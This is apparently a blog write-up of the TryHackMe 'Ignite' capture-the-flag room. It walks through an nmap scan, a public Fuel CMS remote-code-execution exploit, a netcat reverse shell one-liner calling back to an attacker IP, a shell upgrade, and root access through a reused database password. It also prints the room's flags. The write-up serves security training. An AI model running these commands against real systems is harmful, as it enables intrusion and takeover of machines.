---
title: "TryHackMe - Ignite"
date: 2025-05-13 12:00:00 +0000
author: scr4tcher
categories: [TryHackMe CTF]
tags: [Fuel CMS, reverse shell, privilege escalation, web exploitation ]
---

## Introduction

In this post, I'm sharing my step-by-step walkthrough of the [**TryHackMe - Ignite**](https://tryhackme.com/room/ignite) room. This CTF challenge involved exploiting a vulnerable web application, gaining a reverse shell, and escalating privileges to root. The target system runs **Fuel CMS**, which I used as the initial attack vector.


## Reconnaissance
I begin with a comprehensive **Nmap** scan to identify open ports and services:

```console
┌──(kali㉿kali)-[~]
└─$ nmap -sC -sV -T4 -p- -A 10.10.91.169 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-23 09:07 EDT
Nmap scan report for 10.10.91.169
Host is up (0.066s latency).
Not shown: 65534 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Welcome to FUEL CMS
| http-robots.txt: 1 disallowed entry 
|_/fuel/
|_http-server-header: Apache/2.4.18 (Ubuntu)
Aggressive OS guesses: Linux 4.15 (98%), Linux 4.4 (97%), Linux 3.2 - 4.14 (96%), Linux 4.15 - 5.19 (95%), Linux 3.10 - 3.13 (95%), Linux 2.6.32 - 3.10 (95%), Linux 3.10 - 4.11 (94%), Linux 3.8 - 3.16 (93%), Android 9 - 10 (Linux 4.9 - 4.14) (93%), Linux 3.13 (93%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

TRACEROUTE (using port 111/tcp)
HOP RTT      ADDRESS
1   66.31 ms 10.23.0.1
2   66.30 ms 10.10.91.169

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 89.68 seconds
```

Nmap Results Summary:
- Port 80/tcp is open and running **Apache 2.4.18 (Ubuntu)**.

- The HTTP service reveals a Fuel CMS instance.

- robots.txt contains a disallowed path: /fuel/.


## Eploitation

Upon accessing the platform's URL, the **Fuel CMS** version is immediately noticeable.

![](/images/ignite/ignite-fuelcms.jpg)


I searched for publicly available exploits for Fuel CMS version 1.4 and found one on [Exploit-DB](https://www.exploit-db.com/exploits/50477). I used it like this: 


```console

┌──(kali㉿kali)-[~/Desktop/fuel cms]
└─$ python3 script.py -u http://10.10.91.169                 
[+]Connecting...
Enter Command $ls
systemREADME.md
assets
composer.json
contributing.md
fuel
index.php
robots.txt


Enter Command $cat robots.txt
systemUser-agent: *
Disallow: /fuel/

Enter Command $

```

After confirming that the exploit worked, I used a reverse shell generator to create a payload and executed it via the exploit shell:

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.23.x.x 4444 >/tmp/f
```

Once I received a reverse shell connection on my listener, I upgraded it for a more stable interactive session:

```console

python -c 'import pty;pty.spawn("/bin/bash")'

```


With that, I accessed the first user flag located in the `www-data` home directory:

```console
www-data@ubuntu:/home/www-data$ cat flag.txt
cat flag.txt
6470e394cbf6dab6a91682cc8585059b 
www-data@ubuntu:/home/www-data$ 
```


## Privilege Escalation to Root

After gaining initial access to the system, I began reviewing the configuration files of the FuelPHP application located at:
`/var/www/html/fuel/application/config`

Among these files, I discovered one named `database.php`, which contains the application's database connection settings. Upon inspecting its contents, I found the following configuration:

```
$db['default'] = array(
        'dsn'   => '',
        'hostname' => 'localhost',
        'username' => 'root',
        'password' => 'mememe',
        'database' => 'fuel_schema',
        'dbdriver' => 'mysqli',
        'dbprefix' => '',
        'pconnect' => FALSE,
        'db_debug' => (ENVIRONMENT !== 'production'),
        'cache_on' => FALSE,
        'cachedir' => '',
        'char_set' => 'utf8',
        'dbcollat' => 'utf8_general_ci',
        'swap_pre' => '',
        'encrypt' => FALSE,
        'compress' => FALSE,
        'stricton' => FALSE,
        'failover' => array(),
        'save_queries' => TRUE
);
```

The credentials provided here revealed that the MySQL root password is set to `mememe`. I decided to test whether this password also grants access to the root account on the system itself.

Using `su`, I attempted to switch to the root user:


```console
www-data@ubuntu:/var/www/html/fuel/application/config$ su root
su root
Password: mememe

root@ubuntu:/var/www/html/fuel/application/config# cd /root
cd /root
root@ubuntu:~# ls
ls
root.txt
root@ubuntu:~# cat root.txt
cat root.txt
b9bbcb33e11b80be759c4e844862482d 
root@ubuntu:~# 

```

The password successfully authenticated the root account, granting me full administrative privileges. I then navigated to the `/root` directory and retrieved the final flag.


